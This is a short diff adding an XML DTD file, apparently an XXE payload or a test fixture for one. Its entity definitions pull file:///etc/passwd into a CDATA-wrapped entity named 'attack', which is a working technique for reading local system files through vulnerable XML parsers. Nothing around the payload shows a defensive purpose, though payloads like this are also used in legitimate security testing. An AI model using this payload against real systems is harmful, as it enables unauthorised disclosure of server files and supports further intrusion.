@@ -1,0 +1,4 @@
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % stuff SYSTEM "file:///etc/passwd">
+<!ENTITY % end "]]>">
+<!ENTITY attack "%start;%stuff;%end;">
